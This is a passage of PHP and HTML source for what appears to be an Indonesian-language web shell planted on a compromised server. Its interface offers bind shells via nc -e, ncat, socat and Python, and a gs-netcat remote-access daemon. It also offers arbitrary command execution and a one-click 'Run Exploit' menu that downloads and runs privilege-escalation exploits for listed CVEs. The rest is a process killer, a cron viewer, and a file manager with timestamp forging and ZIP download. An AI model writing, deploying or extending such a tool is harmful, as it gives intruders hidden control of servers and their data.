                <select name="bmethod" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <option value="auto">Auto-detect</option>
                    <option value="ncat">ncat -e</option>
                    <option value="nc">nc -e</option>
                    <option value="socat">Socat</option>
                    <option value="python">Python pty</option>
                </select>
                <input type="text" name="bport" placeholder="Bind port" style="margin-bottom:6px;">
                <input type="submit" class="btn btn-green" value="Start Bind">
            </form>
        </div>
    </div>
    <div style="margin-top:14px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="stop_shell"><input type="submit" class="btn btn-red" value="Stop Shell"></form>
        <a class="btn" href="#" onclick="rctPoll();return false;">Refresh Output</a>
        <span class="muted" id="rct-status">idle</span>
    </div>
    <pre id="rct-out" class="out">(belum ada output)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'gs'): ?>
<div class="box">
    <div class="name">GSocket</div>
    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:10px;">
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_download"><input type="submit" class="btn" value="1. Download gs-netcat"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_start"><input type="submit" class="btn btn-green" value="2. Start Daemon"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_stop"><input type="submit" class="btn btn-red" value="Stop"></form>
        <form method="post" style="display:inline;"><input type="hidden" name="shell_action" value="gs_rotate"><input type="submit" class="btn btn-yellow" value="Rotate Secret"></form>
        <a class="btn" href="#" onclick="gsPoll();return false;">Refresh</a>
        <span class="muted" id="gs-status">idle</span>
    </div>
    <div style="margin-top:12px;">
        <div class="muted" style="margin-bottom:4px;">Command:</div>
        <div class="gs-cmd-row"><input type="text" id="gs-cmd" readonly value=""><button type="button" class="btn" onclick="copyGsCmd()">Copy</button></div>
    </div>
    <pre id="gs-out" class="out" style="color:#79c0ff; max-height:220px;">(klik Refresh)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'cmd'): ?>
<div class="box">
    <div class="name">Command Execution</div>
    <form method="post">
        <div class="cmd-row">
            <input type="text" name="cmd" id="cmd" placeholder="Enter command..." autocomplete="off">
            <input type="submit" name="run_cmd" class="btn btn-green" value="Execute">
        </div>
        <div class="quick-cmds">
            <button type="button" class="btn" onclick="setCmd('whoami')">whoami</button>
            <button type="button" class="btn" onclick="setCmd('id')">id</button>
            <button type="button" class="btn" onclick="setCmd('uname -a')">uname -a</button>
            <button type="button" class="btn" onclick="setCmd('ls -la')">ls -la</button>
        </div>
    </form>
</div>
<?php endif; ?>
<?php if ($tab_ext === 'privesc'): ?>
<div class="box">
    <div class="name">Auto Privilege Escalation (CVE Exploiter)</div>
    <div class="muted" style="margin-bottom:10px;">
        Download PoC dari GitHub, compile, & jalankan. Butuh <b>gcc</b> (atau <b>make</b>/<b>nasm</b>).
        Cek dulu: <code>uname -r</code>, <code>cat /proc/sys/user/max_user_namespaces</code>, <code>lsmod | grep act_pedit</code>.
    </div>
    
    <?php if (!empty($privesc_msg)) { ?>
        <div class="msg"><?php echo $privesc_msg; ?></div>
    <?php } ?>

    <div class="form-grid">
        <div>
            <div class="muted"><b>Linux Privilege Escalation</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                <select name="privesc_action" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <optgroup label="2026 (Terbaru)">
                        <option value="copyfail">CVE-2026-31431 (Copy Fail) - Kernel 4.9-6.18 [CISA KEV]</option>
                        <option value="dirtyfrag">CVE-2026-43284 (Dirty Frag) - Kernel</option>
                        <option value="fragnesia">CVE-2026-46300 (Fragnesia) - Kernel [PoC Publik]</option>
                        <option value="pack2root">CVE-2026-41651 (Pack2TheRoot) - PackageKit</option>
                        <option value="pedit_cow">CVE-2026-46331 (Pedit COW) - Kernel 5.18+</option>
                    </optgroup>
                    <optgroup label="2025">
                        <option value="sudo_chroot">CVE-2025-32463 (Sudo Chroot) - Sudo</option>
                        <option value="sudo_host">CVE-2025-32462 (Sudo Host) - Sudo</option>
                    </optgroup>
                    <optgroup label="2024 - 2021 (Klasik)">
                        <option value="nftables">CVE-2024-1086 (nf_tables) - Kernel 5.14-6.6 [CISA KEV]</option>
                        <option value="dirtypipe">CVE-2022-0847 (Dirty Pipe) - Kernel 5.8-5.16</option>
                        <option value="pwnkit">CVE-2021-4034 (PwnKit) - pkexec</option>
                        <option value="baron_samedit">CVE-2021-3156 (Baron Samedit) - Sudo</option>
                    </optgroup>
                </select>
                <div style="margin-top:6px;">
                    <input type="submit" class="btn btn-red" value="Run Exploit" onclick="return confirm('Download & jalankan exploit ini?');">
                </div>
            </form>
            <div class="hint" style="margin-top:12px;">
                <b>Catatan:</b> Beberapa CVE mungkin udah di-patch di RHEL 9.5. <br>
                <b>Copy Fail</b> & <b>Fragnesia</b> butuh user namespace. <b>Pack2TheRoot</b> butuh PackageKit. <br>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>
<?php if ($tab_ext === 'process'): ?>
<?php
$out = array();
$f_exec = F('ex');
@$f_exec('ps -eo pid,user,stat,etime,%cpu,%mem,args --sort=-%cpu 2>/dev/null', $out);
$header = isset($out[0]) ? $out[0] : '';
if (isset($out[0])) unset($out[0]);
$current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
$user_count = array();
foreach ($out as $line) {
    $line = trim($line);
    if (empty($line)) continue;
    $parts = preg_split('/\s+/', $line, 7);
    if (count($parts) >= 7 && isset($parts[1])) {
        $user_count[$parts[1]] = (isset($user_count[$parts[1]]) ? $user_count[$parts[1]] : 0) + 1;
    }
}
?>
<div class="box">
    <div class="name">Process Manager</div>
    <div class="muted" style="margin-bottom:10px;">
        login sebagai <b><?php echo h($current_user); ?></b>.
        Cuma bisa kill proses milik sendiri, kecuali lu udah dapet <code>root</code> lewat tab Privesc.
    </div>
    
    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:10px; font-size:11px;">
        <?php foreach ($user_count as $u => $c) { ?>
            <span style="background:#1b2330; padding:4px 8px; border-radius:4px; border:1px solid #2a3140;">
                <?php echo h($u); ?>: <b style="color:#7ee787;"><?php echo $c; ?></b>
            </span>
        <?php } ?>
    </div>

    <table>
        <tr>
            <th>PID</th>
            <th>User</th>
            <th>STAT</th>
            <th>Time</th>
            <th>CPU%</th>
            <th>MEM%</th>
            <th>Command</th>
            <th>Action</th>
        </tr>
        <?php
        foreach ($out as $line) {
            $line = trim($line);
            if (empty($line)) continue;
            $parts = preg_split('/\s+/', $line, 7);
            if (count($parts) < 7) continue;
            
            list($pid, $user, $stat, $etime, $cpu, $mem, $cmd) = $parts;
            $can_kill = ($user === $current_user || $current_user === 'root');
            $row_style = $can_kill ? '' : 'opacity:0.5;';
            
            echo "<tr style='{$row_style}'>";
            echo "<td>{$pid}</td>";
            echo "<td>" . h($user) . "</td>";
            echo "<td>" . h($stat) . "</td>";
            echo "<td>" . h($etime) . "</td>";
            echo "<td>" . h($cpu) . "</td>";
            echo "<td>" . h($mem) . "</td>";
            echo "<td style='font-family:monospace;font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;' title='" . h($cmd) . "'>" . h($cmd) . "</td>";
            echo "<td>";
            if ((int)$pid > 1) {
                if ($can_kill) {
                    echo "<form method='post' style='display:inline;'>
                            <input type='hidden' name='kill_process' value='{$pid}'>
                            <input type='submit' class='btn btn-red' value='Kill' onclick=\"return confirm('Yakin matiin PID {$pid} ({$user})?');\">
                          </form>";
                } else {
                    echo "<span style='color:#8e99ab;font-size:10px;'>perlu root</span>";
                }
            }
            echo "</td>";
            echo "</tr>";
        }
        ?>
    </table>
</div>
<?php endif; ?>

<?php if ($tab_ext === 'cron'): ?>
<div class="box">
    <div class="name">Persistence &amp; Cron</div>
    <div class="muted" style="margin-bottom:10px;">Cek task otomatis yang jalan di background. Hapus jika mencurigakan.</div>
    
    <div style="margin-bottom:15px;">
        <b>Crontab (www-data / Current User):</b>
        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
        $out = array();
        $f_exec = F('ex');
        @$f_exec('crontab -l 2>&1', $out);
        echo htmlspecialchars(implode("\n", $out));
        ?></pre>
    </div>

    <div style="margin-bottom:15px;">
        <b>System Cron (/etc/cron.d/ &amp; /etc/crontab):</b>
        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
        $out = array();
        @$f_exec('cat /etc/crontab /etc/cron.d/* 2>/dev/null', $out);
        echo htmlspecialchars(implode("\n", $out));
        ?></pre>
    </div>

    <div>
        <b>Systemd Timers:</b>
        <pre style="background:#0a0e14;padding:10px;margin-top:5px;"><?php
        $out = array();
        @$f_exec('systemctl list-timers --all 2>/dev/null | head -20', $out);
        echo htmlspecialchars(implode("\n", $out));
        ?></pre>
    </div>
</div>
<?php endif; ?>
<?php 
$action_page = isset($_GET['action_page']) ? $_GET['action_page'] : '';
$target_file = isset($_GET['target']) ? $_GET['target'] : '';

if ($view != '' && @is_file($view)) { ?>
    
    <!-- HALAMAN VIEW -->
    <div class="box">
        <div class="name">View File: <?php echo h($view); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">Size: <?php echo h(format_size(@filesize($view))); ?> | Perm: <?php echo h(perms($view)); ?></div>
        <?php if (is_image_file($view)) { ?>
            <div style="margin-top:12px;"><img src="?img=<?php echo urlencode($view); ?>" style="max-width:100%; border-radius:8px;" alt=""></div>
        <?php } else { ?>
            <pre><?php echo h(@file_get_contents($view)); ?></pre>
        <?php } ?>
        <div style="margin-top:12px;">
            <a class="btn" href="?path=<?php echo urlencode(dirname($view)); ?>">Back</a>
            <a class="btn btn-green" href="?edit=<?php echo urlencode($view); ?>">Edit</a>
            <a class="btn btn-yellow" href="?download=<?php echo urlencode($view); ?>">Download</a>
        </div>
    </div>

<?php } elseif ($edit != '' && @is_file($edit)) { ?>
    
    <!-- HALAMAN EDIT -->
    <div class="box">
        <div class="name">Edit File: <?php echo h($edit); ?></div>
        <form method="post">
            <input type="hidden" name="action" value="save_file">
            <input type="hidden" name="path" value="<?php echo h(dirname($edit)); ?>">
            <input type="hidden" name="file" value="<?php echo h($edit); ?>">
            <textarea name="content"><?php echo h(@file_get_contents($edit)); ?></textarea>
            <div style="margin-top:12px;">
                <input type="submit" class="btn btn-green" value="Save File">
                <a class="btn" href="?view=<?php echo urlencode($edit); ?>">View</a>
                <a class="btn" href="?path=<?php echo urlencode(dirname($edit)); ?>">Back</a>
            </div>
        </form>
    </div>

<?php } elseif ($action_page != '' && $target_file != '' && @file_exists($target_file)) { 
    $target_name = basename($target_file);
    $target_perm = perms($target_file);
    $target_mtime = date('Y-m-d H:i:s', @filemtime($target_file));
?>

    <div class="box">
        <div class="name"><?php echo strtoupper($action_page); ?>: <?php echo h($target_name); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Path: <?php echo h($target_file); ?><br>
            Perm: <?php echo h($target_perm); ?> | Modified: <?php echo h($target_mtime); ?>
        </div>

        <form method="post" style="max-width: 500px;">
            <input type="hidden" name="action" value="<?php echo h($action_page); ?>">
            <input type="hidden" name="path" value="<?php echo h(dirname($target_file)); ?>">
            <input type="hidden" name="target" value="<?php echo h($target_file); ?>">

            <?php if ($action_page === 'rename'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Nama Baru:</div>
                    <input type="text" name="new" value="<?php echo h($target_name); ?>" required>
                </div>
                <input type="hidden" name="old" value="<?php echo h($target_file); ?>">
                <input type="submit" class="btn btn-green" value="Simpan Nama">

            <?php elseif ($action_page === 'chmod'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Mode (Octal):</div>
                    <input type="text" name="mode" value="<?php echo h($target_perm); ?>" placeholder="(mis: 0644)" required>
                </div>
                <input type="submit" class="btn btn-green" value="Simpan Chmod">

            <?php elseif ($action_page === 'touch'): ?>
                <div style="margin-bottom:8px;">
                    <div class="muted" style="margin-bottom:4px;">Waktu (Format: YYYY-MM-DD HH:MM:SS):</div>
                    <input type="text" name="touch_time" value="<?php echo h($target_mtime); ?>" placeholder="(mis: 2024-05-20 14:30:00)" required>
                </div>
                <input type="submit" class="btn btn-green" value="Simpan Timestamp">
            <?php endif; ?>

            <a class="btn" href="?path=<?php echo urlencode(dirname($target_file)); ?>">Batal / Back</a>
        </form>
    </div>

<?php } else { ?>
    <div class="box">
        <table class="grid">
            <tr>
                <td>
                    <div class="name">New File</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_file">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create"></div>
                    </form>
                </td>
                 <td>
                    <div class="name">New Folder</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_folder">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create"></div>
                    </form>
                 </td>
                 <td>
                    <div class="name">Upload File</div>
                    <form method="post" enctype="multipart/form-data" style="margin-top:10px;">
                        <input type="hidden" name="action" value="upload">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="file" name="upfile">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Upload"></div>
                    </form>
                 </td>
             </tr>
         </table>
    </div>

    <div class="box">
        <div class="name">Directory List</div>
        <div style="margin-top:10px;">
            <form method="post" id="batchForm" autocomplete="off">
                <div id="batchActionBar" style="display:none; margin-bottom:10px; gap:8px; align-items:center; flex-wrap:wrap; background:#1b2330; padding:10px; border-radius:8px; border:1px solid #3a4f6e;">
                    <span style="font-weight:bold; color:#fff;">Batch Action:</span>
                    <input type="text" name="batch_mode" placeholder="(mis: 0755)" style="width:100px;">
                    <button type="submit" name="batch_action" value="delete" class="btn btn-red" onclick="return confirm('Hapus semua file terpilih?');">Delete Selected</button>
                    <button type="submit" name="batch_action" value="chmod" class="btn btn-yellow">Chmod Selected</button>
                    <button type="submit" name="batch_action" value="zip" class="btn btn-blue">Download ZIP</button>
                </div>
                <div style="overflow-x: auto; margin-top:10px;">
                <table class="fm-table">
                    <tr>
                        <th class="col-check"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
                        <th class="col-name">Name</th>
                        <th class="col-small">Type</th>
                        <th class="col-small">Size</th>
                        <th class="col-med">Modified</th>
                        <th class="col-small">Perm</th>
                        <th class="col-small">Owner</th>
                        <th class="col-small">Group</th>
                        <th class="col-actions">Quick Actions</th>
                    </tr>
                    <?php
                    $CAP = 2000;
                    $items = array();
                    $more  = 0;
                    $dh = @opendir($cwd_real);
                    if ($dh !== false) {
                        while (($f = @readdir($dh)) !== false) {
                            if ($f === '.' || $f === '..') continue;
                            if (count($items) < $CAP) { $items[] = $f; } else { $more++; }
                        }
                        @closedir($dh);
                    }
                    $n = 0;
                    if (count($items) > 0) {
                        $dirs = array(); $files = array();
                        foreach ($items as $item) {
                            $full = $cwd_real . '/' . $item;
                            if (@is_dir($full)) { $dirs[] = $item; } else { $files[] = $item; }
                        }
                        sort($dirs, SORT_NATURAL | SORT_FLAG_CASE); sort($files, SORT_NATURAL | SORT_FLAG_CASE);
                        $sorted = array_merge($dirs, $files);
                        foreach ($sorted as $item) {
                            $full = $cwd_real . '/' . $item;
                            $is_dir = @is_dir($full);
                            $mtime = @filemtime($full);
                            $modified = $mtime ? gmdate('Y-m-d H:i:s', $mtime) : '-';
                            $perm_text = perms_string($full);
                            $perm_class = @is_writable($full) ? 'perm-green' : 'perm-white';
                            $item_size = $is_dir ? '-' : format_size(@filesize($full));
                            $item_perm = perms($full);
                            $item_owner = fowner_name($full);
                            $item_group = fgroup_name($full);
                            $n++;
                    ?>
                    <tr>
                        <td style="text-align:center;"><input type="checkbox" name="batch_files[]" value="<?php echo h($item); ?>" class="chkbox" onchange="toggleActionBar()"></td>
                        <td>
                            <?php if ($is_dir) { ?>
                                <span class="dir">[DIR]</span>
                                <a class="dir" href="?path=<?php echo urlencode($full); ?>"><?php echo h($item); ?></a>
                            <?php } else { ?>
                                <span class="file">[FILE]</span>
                                <span class="hoverbox">
                                    <span class="name"><?php echo h($item); ?></span>
                                    <span class="previewbox">
                                        <?php if (is_image_file($full)) { ?>
                                            <img src="?img=<?php echo urlencode($full); ?>" alt="">
                                        <?php } ?>
                                        <div class="miniinfo">
                                            <div class="row"><b>Name:</b> <?php echo h($item); ?></div>
                                            <div class="row"><b>Ext:</b> <?php echo h(file_ext($full)); ?></div>
                                            <div class="row"><b>Size:</b> <?php echo h($item_size); ?></div>
                                            <div class="row"><b>Modified:</b> <?php echo h($modified); ?></div>
                                            <div class="row"><b>Perm:</b> <?php echo h($item_perm); ?></div>
                                            <div class="row"><b>Owner:</b> <?php echo h($item_owner); ?></div>
                                            <div class="row"><b>Group:</b> <?php echo h($item_group); ?></div>
                                            <div class="row"><b>Path:</b> <?php echo h($full); ?></div>
                                        </div>
                                    </span>
                                </span>
                            <?php } ?>
                        </td>
                        <td><?php echo $is_dir ? 'DIR' : 'FILE'; ?></td>
                        <td><?php echo $is_dir ? '-' : h(format_size(@filesize($full))); ?></td>
                        <td><?php echo h($modified); ?></td>
                        <td><span class="<?php echo $perm_class; ?>"><?php echo h($perm_text); ?></span></td>
                        <td style="font-size:11px;"><?php echo h($item_owner); ?></td>
                        <td style="font-size:11px;"><?php echo h($item_group); ?></td>
                        <td class="quick">
                            <?php if (!$is_dir) { ?>
                                <a class="btn" href="?view=<?php echo urlencode($full); ?>">View</a>
                                <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                                <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                            <?php } else { ?>
                                <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
                                <form method="post" style="display:inline;" onsubmit="return confirm('Download folder ini sebagai ZIP?');">
                                    <input type="hidden" name="action" value="zip_folder">
                                    <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                                    <input type="hidden" name="target" value="<?php echo h($full); ?>">
                                    <input type="submit" class="btn btn-blue" value="ZIP" style="padding:2px 6px;font-size:10px;">
                                </form>
                            <?php } ?>
                            <a class="btn" href="?action_page=rename&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Rename</a>
                            <a class="btn" href="?action_page=chmod&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Chmod</a>
                            <a class="btn" href="?action_page=touch&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Touch</a>
                            <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                                <input type="hidden" name="target" value="<?php echo h($full); ?>">
                                <input type="submit" class="btn btn-red" value="Delete" style="padding:2px 6px;font-size:10px;">
                            </form>
                        </td>
                    </tr>
                    <?php
                        }
                    }
                    if ($n == 0) { echo '<tr><td colspan="9">Folder kosong</td></tr>'; }
                    if ($more > 0) { echo '<tr><td colspan="9" style="background:#3a341f;color:#ffd28a;font-weight:bold;">Nampilin ' . $n . ' dari total ' . ($n + $more) . ' entri.</td></tr>'; }
                    ?>
                </table>
                </div>
            </form>
        </div>
    </div>
<?php } ?>
</div>
<script>
function setCmd(cmd) { document.getElementById('cmd').value = cmd; }
function rctPoll() {
    var out = document.getElementById('rct-out');
    var st  = document.getElementById('rct-status');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?shell_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) { out.textContent = x.responseText; st.textContent = x.responseText.indexOf('[alive] yes') > -1 ? 'running' : 'stopped'; }
            else { out.textContent = 'poll error: HTTP ' + x.status; }
        }
    };
    x.send(null);
}
function gsPoll() {
    var out = document.getElementById('gs-out');
    var st  = document.getElementById('gs-status');
    var cmd = document.getElementById('gs-cmd');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?gs_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) {
                var t = x.responseText; out.textContent = t;
                var a = t.indexOf('[alive] yes') > -1; var b = t.indexOf('[binary] present') > -1;
                st.textContent = !b ? 'no binary' : (a ? 'running' : 'stopped');
                var m = t.match(/\[command\]\s*(.+)/); if (m && cmd) cmd.value = m[1].trim();
            } else { out.textContent = 'poll error: HTTP ' + x.status; }
        }
    };
    x.send(null);
}
function copyGsCmd() {
    var e = document.getElementById('gs-cmd');
    if (!e || !e.value) return;
    e.select(); e.setSelectionRange(0, 99999);
    try { document.execCommand('copy'); } catch (x) {}
    if (navigator.clipboard) navigator.clipboard.writeText(e.value).catch(function(){});
}
function fmtSize(s) {
    if (!s || isNaN(s)) return '-';
    if (s >= 1073741824) return (s/1073741824).toFixed(2) + ' GB';
    if (s >= 1048576)    return (s/1048576).toFixed(2) + ' MB';
    if (s >= 1024)       return (s/1024).toFixed(2) + ' KB';
    return s + ' B';
}
function statPoll() {
    var x = new XMLHttpRequest();
    x.open('GET', '?stats=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState !== 4 || x.status !== 200) return;
        var d; try { d = JSON.parse(x.responseText); } catch(e) { return; }
        var up = document.getElementById('stat-uptime'); if (up) up.textContent = d.uptime_h;
        var ram = document.getElementById('stat-ram'); if (ram) ram.textContent = fmtSize(d.mem_avail * 1024);
        var ramt = document.getElementById('stat-ram-total'); if (ramt) ramt.textContent = fmtSize(d.mem_total * 1024);
        var ramp = document.getElementById('stat-ram-pct');
        if (ramp) { ramp.textContent = '(' + d.mem_pct + '% used)'; ramp.style.color = d.mem_pct > 90 ? '#ff7b72' : (d.mem_pct > 70 ? '#e3b341' : '#8e99ab'); }
        var dsk = document.getElementById('stat-disk'); if (dsk) dsk.textContent = fmtSize(d.disk_free);
        var dskt = document.getElementById('stat-disk-total'); if (dskt) dskt.textContent = fmtSize(d.disk_total);
        var dskp = document.getElementById('stat-disk-pct');
        if (dskp) { dskp.textContent = '(' + d.disk_pct + '% used)'; dskp.style.color = d.disk_pct > 90 ? '#ff7b72' : (d.disk_pct > 70 ? '#e3b341' : '#8e99ab'); }
        var ld = document.getElementById('stat-load'); if (ld) ld.textContent = d.load;
    };
    x.send(null);
}
document.addEventListener('DOMContentLoaded', function() {
    toggleActionBar();
});
function toggleAll(source) {
    var checkboxes = document.querySelectorAll('.chkbox');
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
    toggleActionBar();
}

function toggleActionBar() {
    var bar = document.getElementById('batchActionBar');
    if (!bar) return;
    var checked = document.querySelectorAll('.chkbox:checked').length;
    if (checked > 0) {
        bar.style.display = 'flex';
    } else {
        bar.style.display = 'none';
    }
}
statPoll(); setInterval(statPoll, 1500);
<?php if ($tab === 'gs'): ?>gsPoll(); setInterval(gsPoll, 3000);<?php endif; ?>
<?php if ($tab === 'shell'): ?>rctPoll(); setInterval(rctPoll, 3000);<?php endif; ?>
</script>
</body>
</html>
